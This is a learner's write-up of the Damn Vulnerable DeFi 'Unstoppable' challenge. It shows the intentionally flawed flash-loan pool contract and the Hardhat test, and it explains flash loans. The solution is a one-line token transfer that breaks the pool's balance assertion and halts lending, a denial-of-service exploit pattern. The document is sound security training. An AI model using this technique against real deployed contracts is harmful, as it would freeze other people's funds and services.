# Damn Vulnerable Defi: Unstoppable

Intro to the project and understanding smart contracts, with the goal to make it stop working

## The Task Intro

There's a lending pool with a million DVT tokens in balance, offering flash loans for free. If only there was a way to attack and stop the pool from offering flash loans ...

You start with 100 DVT tokens in balance.

## The Task Code

UnstoppableLender.sol

```apache
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

/**
 * @title UnstoppableLender
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract UnstoppableLender is ReentrancyGuard {

    IERC20 public immutable damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        // Ensured by the protocol via the `depositTokens` function
        assert(poolBalance == balanceBefore);

        damnValuableToken.transfer(msg.sender, borrowAmount);

        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
```

ReceiverUnstoppable.sol

```apache
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverUnstoppable {

    UnstoppableLender private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    // Pool will call this function during the flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");
        // Return all tokens to the pool
        require(IERC20(tokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }
}
```

The unstoppable.challenge.js

```apache
const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Unstoppable", function () {
  let deployer, attacker, someUser;

  // Pool has 1M * 10**18 tokens
  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
  const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther("100");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, attacker, someUser] = await ethers.getSigners();

    const DamnValuableTokenFactory = await ethers.getContractFactory("DamnValuableToken", deployer);
    const UnstoppableLenderFactory = await ethers.getContractFactory("UnstoppableLender", deployer);

    this.token = await DamnValuableTokenFactory.deploy();
    this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

    await this.token.approve(this.pool.address, TOKENS_IN_POOL);
    await this.pool.depositTokens(TOKENS_IN_POOL); // transfers token to smart contract

    const poolBal = await this.token.balanceOf(this.pool.address);
    expect(poolBal).to.equal(TOKENS_IN_POOL);
    console.log(ethers.utils.formatEther(poolBal));

    await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE); //transfers token from the deployer to the attacker

    const attackerBal = await this.token.balanceOf(attacker.address);
    expect(attackerBal).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
    console.log(ethers.utils.formatEther(attackerBal));

    // Show it's possible for someUser to take out a flash loan
    const ReceiverContractFactory = await ethers.getContractFactory("ReceiverUnstoppable", someUser);
    this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
    await this.receiverContract.executeFlashLoan(10);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    await this.token.connect(attacker).transfer(this.pool.address, 50);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // It is no longer possible to execute flash loans
    await expect(this.receiverContract.executeFlashLoan(10)).to.be.reverted;
  });
});
```

## The Solution

Thats a lot of code and new concepts to digest. But we are in Rareskills :-), so we can show what we can. Defi is a very fascinating aspect of the blockchain, flashloans or flashmints concepts I never heard of.

But hey, its about getting a loan for a commission without a collateral. This is possible because all is handled in a transaction - if the borrower cannot pay back, the full transaction fails; only gas fees need to be payed. If a transaction succeeds, it is a laverage at marginal cost for the borrower. The lenders get an interesting interest earning potential.

The implementation is more difficult as I guess I will learn throght the damn vulnerable defi exercises.

So I studied the three files above watched quite some Youtube videos and studied the EIP 3156 Flash Loan standard. The flow is as this:

1. A flash loan receiver contract calls a lender contract
2. the lender contract calls the receiver contract back, after assigning the loan in tokens
3. the borrower does his logic of arbitrage, liquidation, etc.
4. After the logic happend, the borrower needs to approve the lender to get the token back
5. the lender tries to get the token plus a fee back.
6. If one point fails, the transaction fails, if all points succeed, the transaction is through

What a fascinating concept!

Now with this concrete Unstoppable problem, the exploit is easy. the lender has one line of code that checks the amount of tokens trackt in the lending contract is the same as as the tracking on the token.

```apache
// Ensured by the protocol via the `depositTokens` function
assert(poolBalance == balanceBefore);
```

What is probably meant as a good idea, never leve the token balance of the contract out of sync with the loan contract, fails dramatically with one line:

```apache
await this.token.connect(attacker).transfer(this.pool.address, 50);
```

Sending a few tokens to the lender smart contract breaks the contract and no more lending/borrowing is possible!
